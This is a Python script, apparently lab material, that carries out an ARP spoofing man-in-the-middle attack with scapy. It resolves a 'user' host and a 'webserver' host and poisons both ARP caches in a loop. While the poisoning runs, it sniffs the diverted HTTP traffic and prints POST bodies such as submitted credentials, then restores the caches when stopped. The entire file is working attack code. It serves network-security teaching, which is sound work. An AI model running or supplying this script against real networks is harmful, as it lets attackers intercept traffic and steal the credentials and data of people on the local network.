"""
Lab - ARP Spoof Attack
    > Static attack code

# To enable ip forwarding on the host for further tests:
# echo 1 > /proc/sys/net/ipv4/ip_forward

(CC BY-SA 4.0) github.com/moospit
"""

from scapy.all import *
from scapy.layers.http import HTTPRequest
import logging
import time

# supress scapy import warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Easy way to execute commands and retreive its output
def system(cmd):
    from os import popen
    with popen(f"{cmd} 2>&1") as p:
        return p.read().strip()

# Returns a host"s IP and hardware adresses
def resolve(host):
    ping = system(f"ping -W1 -w1 -c1 {host}")
    if not ping.startswith("PING"):
        raise Exception(f"Unable to resolve IP of '{host}'")

    ip = ping.splitlines()[0].split(" ")[2][1:-1]
    if not ip:
        raise Exception(f"Unable to extract IP from ping response:\n" + ping)

    arp = system(f"arp -na | grep '{ip}'")
    if not arp.startswith("?"):
        raise Exception(f"Unable to resolve MAC of '{host}' ({ip})")

    mac = arp.split(" ")[3]
    if not mac:
        raise Exception(f"Unable to extract MAC from arp response:\n" + arp)

    return (ip, mac)


ATTACKER_IP, ATTACKER_HW = (get_if_addr("eth0"), get_if_hwaddr("eth0"))
USER_IP, USER_HW = resolve("user")
WEBSERVER_IP, WEBSERVER_HW = resolve("webserver")

print("[>] Resolved IPs and HWs")
print(f" [+] ATTACKER:  {ATTACKER_IP} {ATTACKER_HW}")
print(f" [+] USER:      {USER_IP} {USER_HW}")
print(f" [+] WEBSERVER: {WEBSERVER_IP} {WEBSERVER_HW}")


def process_packet(pkt: Packet) -> None:
    """ Process the sniffed packets """
    if pkt.haslayer(HTTPRequest):
        req = pkt[HTTPRequest]
        url = req.Host.decode()
        path = req.Path.decode()
        method = req.Method.decode()

        print(f"[+] HTTP: {url}{path} -> {method}")
        if method == "POST" and pkt.haslayer(Raw):
            print(f" [>] {pkt[Raw].load}")


def main() -> None:
    """ Do the attack """
    sniff = AsyncSniffer(iface="eth0", prn=process_packet,
                         store=False)

    try:
        sniff.start()
        print("[>] Starting poisoning")
        while True:
            send(ARP(op="is-at", pdst=USER_IP,
                 psrc=WEBSERVER_IP, hwsrc=ATTACKER_HW), verbose=False)
            send(ARP(op="is-at", pdst=WEBSERVER_IP,
                 psrc=USER_IP, hwsrc=ATTACKER_HW), verbose=False)
            time.sleep(1)  # We don"t flood the network
    except KeyboardInterrupt:
        print("\n[>] Got keyboard interrupt")
    finally:
        sniff.stop()

    # Clean up the victim"s arp caches
    print("[>] Cleaning up")
    send(ARP(op="is-at", pdst=USER_IP, psrc=WEBSERVER_IP,
         hwsrc=WEBSERVER_HW), verbose=False)
    send(ARP(op="is-at", pdst=WEBSERVER_IP, psrc=USER_IP,
         hwsrc=USER_HW), verbose=False)


if __name__ == "__main__":
    main()
